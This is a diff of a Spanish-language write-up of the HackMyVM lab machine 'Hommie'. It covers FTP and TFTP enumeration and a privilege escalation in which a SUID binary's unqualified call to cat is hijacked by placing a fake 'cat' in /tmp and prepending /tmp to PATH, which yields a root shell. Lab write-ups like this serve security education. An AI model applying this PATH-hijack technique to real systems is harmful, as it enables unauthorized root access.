@@ -12,7 +12,7 @@ header:
 categories:
   - hackmyvm
   - linux
-  - Fácil
+  - fácil
 tags:
   - hackmyvm
   - tftp
@@ -78,7 +78,7 @@ Nos conectamos al servidor FTP.
 ```
 ![](/assets/images/hmvm-Hommie/ftp.png)
 
-Entramos al directorio `.web` y nos descargamos el index.html con el comando `get`
+Entramos al directorio `.web` y nos descargamos el index.html.
 ```bash
 ftp> cd .web
 250 Directory successfully changed.
@@ -94,7 +94,7 @@ local: index.html remote: index.html
 226 Transfer complete.
 ```
 
-Abrimos `index.html`, vemos que es la página que vimos anteriormente con curl.
+Abrimos `index.html`y vemos que es la página que vimos anteriormente con curl.
 
 ![](/assets/images/hmvm-Hommie/catindex.png)
 
@@ -109,7 +109,7 @@ PORT   STATE         SERVICE VERSION
 69/udp open|filtered tftp
 ```
 
-Nmap encuentra dos puertos, el que nos interesa es el `69` TFTP (Trivial File Transfer Protocol)
+Nmap encuentra dos puertos, el que nos interesa es el 69 tftp (Trivial File Transfer Protocol)
 
 ![](/assets/images/hmvm-Hommie/tftp.png)
 
@@ -131,7 +131,7 @@ alexia@hommie:~$ cat user.txt
 Imxxxxxxt
 ```
 
-En el directorio /opt vemos un binario con nombre `showMetheKey` con permisos SUID.
+En el directorio /opt vemos un binario `showMetheKey`, este binario tiene permisos SUID.
 ```bash
 alexia@hommie:/opt$ ls -la
 total 28
@@ -140,21 +140,25 @@ drwxr-xr-x 18 root root  4096 Sep 30  2020 ..
 -rwsr-sr-x  1 root root 16720 Sep 30  2020 showMetheKey
 ```
 
-Le paso un strings al binario y vemos que esta imprimiendo la clave ssh con cat así que aquí podemos explotar la variable PATH.
+Le paso un strings al binario y vemos que esta imprimiendo el archivo `id_rsa` con cat así que aquí podemos explotar la variable PATH.
 
 ![](/assets/images/hmvm-Hommie/stringsSUID.png)
 
-Nos vamos al directorio /tmp y creamos un archivo con el nombre cat y en su interior lo dejamos como la imagen:
+Nos vamos al directorio /tmp y creamos un archivo con el nombre cat y le damos permisos de ejecución.
 
 ```bash
 alexia@hommie:/opt$ cd /tmp
 alexia@hommie:/tmp$ touch cat
-alexia@hommie:/tmp$ nano cat
 alexia@hommie:/tmp$ chmod +x cat
+```
+En su interior lo dejamos como la imagen:
+
+```bash
+alexia@hommie:/tmp$ nano cat
 ```
 ![](/assets/images/hmvm-Hommie/ficherocat.png)
 
-Exportamos el PATH al directorio `/tmp` que es donde hemos creado el fichero.
+Exportamos el PATH al directorio `/tmp` que es donde hemos creado el archivo.
 ```bash
 alexia@hommie:/tmp$ export PATH=/tmp:$PATH
 ```
@@ -166,7 +170,7 @@ root@hommie:/tmp# id
 uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(alexia)
 ```
 
-Vamos al directorio /root para leer la flag de root pero no está la flag de root  sino un fichero de texto `note.txt`.
+Vamos al directorio /root para leer la flag pero no está la flag, hay un fichero de texto `note.txt`.
 ```bash
 root@hommie:/root# ls
 note.txt
